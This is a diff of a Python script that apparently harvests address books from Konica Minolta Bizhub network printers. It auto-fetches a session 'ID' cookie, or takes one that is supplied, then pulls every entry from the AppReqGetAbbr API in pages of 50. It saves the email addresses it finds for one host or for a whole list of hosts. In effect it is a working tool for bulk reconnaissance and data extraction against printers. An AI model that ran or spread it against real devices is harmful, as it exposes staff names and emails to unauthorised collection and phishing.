@@ -12,66 +12,68 @@ warnings.simplefilter("ignore", InsecureRequestWarning)
 
 CHUNK_SIZE = 50  # Number of entries to request each time
 
-def get_working_protocol(host, debug=False):
-    """
-    Try HTTP first, then fallback to HTTPS if HTTP fails.
-    Ensures consistency for all requests to the same host.
-    """
-    test_url_http = f"http://{host}/wcd/index.html"
-    test_url_https = f"https://{host}/wcd/index.html"
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description="Chunked Bizhub address book fetch: auto-get or use a known cookie, then fetch in pages of 50."
+    )
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument("--ip", help="Single IP or hostname.")
+    group.add_argument("--list", help="File containing a list of IPs/hosts (one per line).")
 
-    for protocol in ["http", "https"]:
-        url = test_url_http if protocol == "http" else test_url_https
+    parser.add_argument(
+        "-c", "--cookie",
+        default=None,
+        help="If you already have a valid 'ID=...' cookie, supply it here. Otherwise, the script auto-fetches."
+    )
+    parser.add_argument(
+        "-n", "--names",
+        action="store_true",
+        help="If set, also dump the list of user names (in addition to emails)."
+    )
+    parser.add_argument(
+        "-d", "--debug",
+        action="store_true",
+        help="Print debug info, including response details and cookie info."
+    )
+    return parser.parse_args()
+
+def auto_get_cookie(host, debug=False):
+    """
+    Attempt to get a cookie, first using HTTPS. If it fails, fall back to HTTP.
+    """
+    for protocol in ["https", "http"]:
+        url = f"{protocol}://{host}/wcd/index.html"
+        session = requests.Session()
         try:
-            r = requests.get(url, verify=False, timeout=5)
+            r = session.get(url, verify=False, timeout=10)
+            if debug:
+                print(f"[DEBUG] GET {url} -> status {r.status_code}")
+                print("[DEBUG] Response headers:\n", r.headers)
+                print("[DEBUG] Response body:\n", r.text[:400] + ("..." if len(r.text) > 400 else ""))
+
             r.raise_for_status()
-            if debug:
-                print(f"[DEBUG] {protocol.upper()} works for {host}, using {protocol} for all requests.")
-            return protocol
-        except requests.exceptions.RequestException:
-            if debug:
-                print(f"[DEBUG] {protocol.upper()} failed for {host}, trying alternate.")
-            continue
+            if "ID" in session.cookies:
+                if debug:
+                    print(f"[DEBUG] Auto-fetched cookie over {protocol.upper()} for {host}:")
+                    for ck in session.cookies:
+                        print("   ", ck.name, "=", ck.value)
+                return session, protocol  # Return the session and working protocol
 
-    print(f"[X] No working protocol found for {host}. Skipping.")
-    return None
+        except requests.exceptions.RequestException as e:
+            if debug:
+                print(f"[DEBUG] Error fetching cookie from {protocol}://{host}: {e}")
+            continue  # Try the next protocol
 
-def auto_get_cookie(host, protocol, debug=False):
+    print(f"[!] Failed to retrieve an ID cookie over both HTTPS and HTTP for {host}.")
+    return None, None
+
+def fetch_abbr_chunk(host, protocol, session=None, cookie_value=None, start=1, end=50, debug=False):
     """
-    Perform a GET to {protocol}://<host>/wcd/index.html to see if the device sets an 'ID' cookie automatically.
-    """
-    url = f"{protocol}://{host}/wcd/index.html"
-    session = requests.Session()
-    
-    try:
-        r = session.get(url, verify=False, timeout=10)
-        if debug:
-            print(f"[DEBUG] GET {url} -> status {r.status_code}")
-            print("[DEBUG] Response headers:\n", r.headers)
-
-        r.raise_for_status()
-        if "ID" in session.cookies:
-            if debug:
-                print("[DEBUG] Auto-fetched cookies in session:")
-                for ck in session.cookies:
-                    print("   ", ck.name, "=", ck.value)
-            return session
-        else:
-            if debug:
-                print("[DEBUG] No 'ID' cookie was set by GET /wcd/index.html.")
-            return None
-    except requests.exceptions.RequestException as e:
-        if debug:
-            print(f"[DEBUG] Error auto-fetching cookie from {host}: {e}")
-        return None
-
-def fetch_abbr_chunk(host, protocol, session=None, start=1, end=50, debug=False):
-    """
-    Fetch one chunk (start..end) from /wcd/api/AppReqGetAbbr using the detected protocol.
-    Returns the parsed JSON dict (or None on failure).
+    Fetch one chunk (start..end) from /wcd/api/AppReqGetAbbr.
+    Uses the working protocol.
     """
     url = f"{protocol}://{host}/wcd/api/AppReqGetAbbr"
-    
+
     payload = {
         "AbbrListCondition": {
             "WellUse": "false",
@@ -95,18 +97,31 @@ def fetch_abbr_chunk(host, protocol, session=None, start=1, end=50, debug=False)
     try:
         if session:
             if debug:
-                print(f"[DEBUG] Fetching {start}-{end} using session cookies.")
+                print(f"[DEBUG] Fetching {start}-{end} using session cookie(s) over {protocol.upper()}.")
             resp = session.post(url, json=payload, verify=False, timeout=15)
         else:
+            cookie_dict = {}
+            if cookie_value:
+                val = cookie_value
+                if val.startswith("ID="):
+                    val = val[3:]
+                cookie_dict["ID"] = val.strip()
+
             if debug:
-                print(f"[DEBUG] Fetching {start}-{end} without session cookies.")
-            resp = requests.post(url, json=payload, verify=False, timeout=15)
+                print(f"[DEBUG] Fetching {start}-{end} over {protocol.upper()} with cookie:", cookie_dict)
+            resp = requests.post(url, json=payload, cookies=cookie_dict, verify=False, timeout=15)
 
         if debug:
             print(f"[DEBUG] chunk {start}-{end} -> HTTP {resp.status_code}")
+            print("[DEBUG] Response body:", resp.text[:400] + ("..." if len(resp.text) > 400 else ""))
 
         if resp.status_code == 200:
-            return resp.json()
+            try:
+                return resp.json()
+            except json.JSONDecodeError:
+                if debug:
+                    print("[DEBUG] JSON decode error for chunk", start, end)
+                return None
         else:
             if debug:
                 print("[DEBUG] Non-200 status code:", resp.status_code)
@@ -119,8 +134,7 @@ def fetch_abbr_chunk(host, protocol, session=None, start=1, end=50, debug=False)
 
 def fetch_all_abbr(host, protocol, session=None, debug=False):
     """
-    Fetch all address entries by chunking in increments of CHUNK_SIZE (50).
-    Returns (allAbbrList, arraySize) or ([], 0) if nothing found or error.
+    Fetch all address entries in chunks using the detected working protocol.
     """
     all_abbr = []
     current_start = 1
@@ -130,8 +144,7 @@ def fetch_all_abbr(host, protocol, session=None, debug=False):
     if not data:
         return ([], 0)
 
-    mfp_obj = data.get("MFP", {})
-    abbr_list_data = mfp_obj.get("AbbrList", {})
+    abbr_list_data = data.get("MFP", {}).get("AbbrList", {})
     total_size = int(abbr_list_data.get("ArraySize", "0"))
 
     first_chunk_abbr = abbr_list_data.get("Abbr", [])
@@ -145,15 +158,15 @@ def fetch_all_abbr(host, protocol, session=None, debug=False):
         if not data:
             break
 
-        mfp_obj = data.get("MFP", {})
-        abbr_list_data = mfp_obj.get("AbbrList", {})
-        chunk_abbr = abbr_list_data.get("Abbr", [])
+        chunk_abbr = data.get("MFP", {}).get("AbbrList", {}).get("Abbr", [])
         all_abbr.extend(chunk_abbr)
 
     return (all_abbr, total_size)
 
 def extract_names_and_emails(abbr_entries):
-    """Extracts names and emails from the fetched address book data."""
+    """
+    Extracts names and emails from address book entries.
+    """
     names = []
     emails = []
 
@@ -170,25 +183,20 @@ def extract_names_and_emails(abbr_entries):
 
 def process_host(host, debug=False):
     """Handles the full address book extraction for a single host."""
-    protocol = get_working_protocol(host, debug)
-    if not protocol:
-        return
-
-    session = auto_get_cookie(host, protocol, debug=debug)
+    session, protocol = auto_get_cookie(host, debug=debug)
     if not session:
-        print(f"[!] Could not retrieve an ID cookie automatically from {host}. Skipping.")
         return
 
     abbr_list, array_size = fetch_all_abbr(host, protocol, session=session, debug=debug)
 
     if not abbr_list:
-        print("    [!] No address book entries found.")
+        print(f"[!] No address book entries found for {host}.")
         return
 
     names, emails = extract_names_and_emails(abbr_list)
 
     if not emails:
-        print("    [!] No email addresses found.")
+        print(f"[!] No email addresses found for {host}.")
         return
 
     email_filename = f"bizhub-addrBk_emailAddr_{host}.txt"
@@ -196,20 +204,17 @@ def process_host(host, debug=False):
         for em in sorted(set(emails)):
             f.write(em + "\n")
 
-    print(f"    -> Emails saved to: {email_filename}")
+    print(f"[+] Extracted {len(emails)} email addresses from {host} -> {email_filename}")
 
 def main():
-    parser = argparse.ArgumentParser(description="Extract internal address books from network printers.")
-    parser.add_argument("-i", "--input", help="File containing list of printer IPs", required=True)
-    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug output")
+    parser = parse_args()
 
-    args = parser.parse_args()
+    hosts = [parser.ip] if parser.ip else open(parser.list).read().splitlines()
 
-    with open(args.input, "r", encoding="utf-8") as f:
-        for line in f:
-            host = line.strip()
-            if host:
-                process_host(host, debug=args.debug)
+    for host in hosts:
+        host = host.strip()
+        if host:
+            process_host(host, debug=parser.debug)
 
 if __name__ == "__main__":
     main()
